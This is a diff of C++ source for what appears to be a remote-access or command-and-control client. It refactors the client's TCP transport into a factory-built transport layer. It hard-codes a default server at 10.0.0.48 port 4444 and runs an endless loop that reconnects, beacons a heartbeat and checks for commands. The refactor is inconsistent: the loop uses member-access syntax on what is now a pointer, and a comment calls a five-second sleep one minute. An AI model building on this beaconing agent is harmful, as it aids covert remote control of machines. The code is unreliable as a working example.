@@ -11,22 +11,50 @@
 
 
 #include "Client.h"
+#include "TransportLayer.h"
 
 
 
+/*
+Client::Client() : 
+	transportLayer_(messageHandler_, "10.0.0.48", "4444") // Default server address
+{
+	messageHandler_.setTransportLayer(transportLayer_);
+}
+
+Client::Client(TCPtransportLayer transportLayer, std::string server, std::string port) : // TODO: transporter parameter isn't used 
+	transportLayer_(messageHandler_, server, port)
+{
+	messageHandler_.setTransportLayer(transportLayer_);
+}*/
 
 
 Client::Client() : 
-	transporter_(messageHandler_, "10.0.0.48", "4444") // Default server address
+	transportLayer_(TransportLayerFactory::create(
+		TransportLayerType::TCP,
+		messageHandler_,
+		"10.0.0.48",
+		"4444"))
 {
-	messageHandler_.setTransporter(transporter_);
+	messageHandler_.setTransportLayer(*transportLayer_);
 }
 
-Client::Client(TCPTransporter transporter, std::string server, std::string port) : // TODO: transporter parameter isn't used 
-	transporter_(messageHandler_, server, port)
+// Constructor with specific transport type
+Client::Client(TransportLayerType transportType, const std::string& server, const std::string& port) :
+	transportLayer_(TransportLayerFactory::create(transportType, messageHandler_, server, port))
 {
-	messageHandler_.setTransporter(transporter_);
+	messageHandler_.setTransportLayer(*transportLayer_);
 }
+
+// Constructor with custom transporter (for testing)
+Client::Client(TransportLayerUniquePtr transporter) :
+	transportLayer_(std::move(transporter))
+{
+	messageHandler_.setTransportLayer(*transportLayer_);
+}
+
+
+
 
 bool Client::run()
 {	
@@ -49,11 +77,11 @@ bool Client::run()
 
 	while (true)
 	{
-		if (!transporter_.isConnected())
+		if (!transportLayer_.isConnected())
 		{
-			transporter_.connect();    // Try to connect (handles if already connected)
+			transportLayer_.connect();    // Try to connect (handles if already connected)
 		}
-		transporter_.beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
+		transportLayer_.beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
 		//transporter_.receive();
 		//transporter_.sendMessage();
 		Sleep(5000);            // Wait 1 minute
